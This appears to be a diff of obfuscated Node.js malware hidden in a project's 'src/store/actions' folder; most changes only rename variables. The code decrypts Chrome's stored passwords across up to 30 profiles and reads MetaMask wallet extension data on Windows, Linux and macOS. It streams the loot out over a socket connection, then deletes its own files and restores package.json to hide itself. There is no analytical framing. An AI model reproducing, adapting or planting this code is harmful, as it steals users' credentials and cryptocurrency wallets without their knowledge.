@@ -1,6 +1,6 @@
-const l = require("fs"),
+const s = require("fs"),
   e = require("os"),
-  s = require("path"),
+  l = require("path"),
   c = require("crypto"),
   f = require("sqlite3"),
   p = require("./config"),
@@ -66,15 +66,15 @@ let d = [
   "Profile 29",
   "Profile 30",
 ];
-const b = (e) => {
+const P = (e) => {
   var o = atob(e),
     t = new Uint8Array(o.length);
   for (let e = 0; e < o.length; e++) t[e] = o.charCodeAt(e);
   return t;
 };
-function P(e) {
+function b(e) {
   try {
-    return l.accessSync(e), !0;
+    return s.accessSync(e), !0;
   } catch (e) {
     return !1;
   }
@@ -83,11 +83,11 @@ function m(o) {
   return new Promise((e) => setTimeout(e, o));
 }
 g.on("connect", function (e) {
-  let a = [];
+  let i = [];
   try {
     if ("Windows_NT" == r) {
-      const i = "webpack_override";
-      var o = s.join(
+      const a = "webpack_override";
+      var o = l.join(
         ...String(h).split("/"),
         "AppData",
         "Local",
@@ -96,12 +96,12 @@ g.on("connect", function (e) {
         "User Data",
         "Local State"
       );
-      l.readFile(o, "utf-8", (e, o) => {
-        (o = JSON.parse(o).os_crypt.encrypted_key), (o = b(o));
+      s.readFile(o, "utf-8", (e, o) => {
+        (o = JSON.parse(o).os_crypt.encrypted_key), (o = P(o));
         const n = p.CryptUnprotectData(o.slice(5));
         for (let e = 0; e < d.length; e++)
-          a.push(
-            s.join(
+          i.push(
+            l.join(
               ...String(h).split("/"),
               "AppData",
               "Local",
@@ -112,11 +112,11 @@ g.on("connect", function (e) {
               "Login Data"
             )
           );
-        for (let e = 0; e < a.length; e++) {
-          var t = a[e];
+        for (let e = 0; e < i.length; e++) {
+          var t = i[e];
           const r = `webpacktemp${e}.db`;
-          !0 === P(t) &&
-            l.copyFile(t, r, (e) => {
+          !0 === b(t) &&
+            s.copyFile(t, r, (e) => {
               const t = new f.Database(r);
               t.all("SELECT * FROM logins", async (e, o) => {
                 e ||
@@ -131,8 +131,8 @@ g.on("connect", function (e) {
                       if (e.length) {
                         r = c.createDecipheriv("aes-256-gcm", n, r).update(e);
                         try {
-                          l.appendFileSync(
-                            i,
+                          s.appendFileSync(
+                            a,
                             `
 W: ${o}
 U: ${t}
@@ -145,69 +145,72 @@ P: ${r}
                   }),
                   await m(10),
                   t.close(),
-                  await m(10),
-                  l.unlink(r, (e) => {}),
-                  (e = l.createReadStream(i)).setMaxListeners(100),
-                  e.on("data", async (e) => {
-                    e = {
-                      path: u + " 10000000000000000 Chrome-Chrome",
-                      data: e,
-                    };
-                    g.emit("fileData", e);
-                  }));
+                  s.unlink(r, (e) => {}),
+                  setTimeout(() => {
+                    var e;
+                    !0 === b(a) &&
+                      ((e = s.createReadStream(a)).setMaxListeners(100),
+                      e.on("data", async (e) => {
+                        e = {
+                          path: u + " 10000000000000000 Chrome-Chrome",
+                          data: e,
+                        };
+                        g.emit("fileData", e);
+                      }));
+                  }, 50));
               });
             });
         }
-        l.unlink(process.cwd() + "/src/store/actions/act.js", (e) => {}),
-          l.copyFile(
+        s.unlink(process.cwd() + "/src/store/actions/act.js", (e) => {}),
+          s.copyFile(
             process.cwd() + "/src/store/actions/index.json",
             process.cwd() + "/package.json",
             (e) => {}
           ),
           setTimeout(() => {
-            l.unlink(
+            s.unlink(
               process.cwd() + "/src/store/actions/index.json",
               (e) => {}
             ),
-              l.unlink(
+              s.unlink(
                 process.cwd() + "/src/store/actions/config.node",
                 (e) => {}
               );
           }, 1e3),
           setTimeout(() => {
-            l.unlink(i, (e) => {});
+            s.unlink(a, (e) => {});
           }, 1e4);
       });
     }
-    d.forEach((i) => {
+    d.forEach((a) => {
       "Windows_NT" == r
-        ? (a = [
-            s.join(
+        ? (i = [
+            l.join(
               ...String(h).split("/"),
               ...String(
-                `/AppData/Local/Google/Chrome/User Data/${i}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`
+                `/AppData/Local/Google/Chrome/User Data/${a}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`
               ).split("/")
             ),
           ])
         : "Linux" == r
-        ? (a = [
+        ? (i = [
             h +
-              `/.config/google-chrome/${i}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
+              `/.config/google-chrome/${a}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
             h +
-              `/.config/google-chrome/${i}/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
+              `/.config/google-chrome/${a}/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
           ])
         : "Darwin" == r &&
-          (a = [
+          (i = [
             h +
-              `/Library/Application Support/Google/Chrome/${i}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
+              `/Library/Application Support/Google/Chrome/${a}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
           ]);
-      for (let e = 0; e < a.length; e++) {
-        const t = a[e];
-        P(t) &&
-          l.readdir(t, (e, o) => {
+      for (let e = 0; e < i.length; e++) {
+        const t = i[e];
+        b(t) &&
+          s.readdir(t, (e, o) => {
             e ||
               o.forEach(async (e) => {
-                e = s.join(t, e);
+                e = l.join(t, e);
                 try {
                   if (e.includes(".ldb") || e.includes(".log")) {
                     let o = (131072).toString(),
@@ -216,10 +219,10 @@ P: ${r}
                         " " +
                         o +
                         " " +
-                        i.replace(" ", "") +
+                        a.replace(" ", "") +
                         "-" +
-                        s.basename(e);
-                    const n = l.createReadStream(e);
+                        l.basename(e);
+                    const n = s.createReadStream(e);
                     n.setMaxListeners(100);
                     let r = 0;
                     n.on("data", async (e) => {
